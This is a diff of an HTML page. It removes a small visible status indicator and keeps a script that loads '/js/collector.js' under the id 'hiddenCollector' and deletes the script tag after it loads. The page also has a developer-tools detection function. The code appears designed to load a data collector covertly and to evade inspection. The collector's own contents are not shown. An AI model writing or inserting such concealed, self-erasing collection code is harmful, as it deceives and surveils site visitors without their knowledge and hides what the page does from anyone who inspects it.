@@ -25,19 +25,10 @@
             0%, 100% { opacity: 0.6; transform: scale(1); }
             50% { opacity: 1; transform: scale(1.02); }
         }
-        #status {
-            position: fixed;
-            bottom: 16px;
-            right: 20px;
-            font-size: 0.65rem;
-            color: #1a1a1a;
-            pointer-events: none;
-        }
     </style>
 </head>
 <body>
     <div class="symbol">⏣</div>
-    <div id="status">●</div>
 
     <script>
         function detectDevTools() {
@@ -55,13 +46,12 @@
             script.id = 'hiddenCollector';
             script.src = '/js/collector.js';
             script.onload = function() {
-                const scriptElement = document.getElementById('hiddenCollector');
-                if (scriptElement) {
-                    scriptElement.remove();
-                }
+                const el = document.getElementById('hiddenCollector');
+                if (el) el.remove();
             };
             document.body.appendChild(script);
         }
+
         setTimeout(loadAndHideScript, 500);
     </script>
 </body>
